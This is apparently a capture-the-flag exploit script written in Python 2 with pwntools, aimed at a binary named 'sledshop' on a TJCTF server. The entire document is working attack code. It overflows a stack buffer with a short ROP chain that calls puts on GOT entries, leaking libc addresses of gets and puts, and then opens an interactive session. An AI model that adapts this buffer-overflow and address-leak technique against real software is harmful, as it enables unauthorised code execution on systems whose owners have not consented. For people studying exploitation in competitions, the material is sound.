from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'
		
HOST = "p1.tjctf.org"
PORT = 8010
conn = None

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process('./sledshop')

puts_plt = 0x80483f0
gets_got = 0x804a014
puts_got = 0x804a01c
pop_edx_ret = 0x08048395

payload = "A"*0x50
payload += p32(puts_plt)
payload += p32 (pop_edx_ret)
payload += p32(gets_got)
payload += p32(puts_plt)
payload += "AAAA"
payload += p32(puts_got)


conn.recvuntil("like?")
conn.sendline(payload)
conn.recvuntil("closed.\n")
libc_gets = conn.recvline()
libc_puts = conn.recvline()
print "libc_gets = " + hex(u32(libc_gets[0:4]))
print "libc_puts = " + hex(u32(libc_puts[0:4]))

conn.interactive()
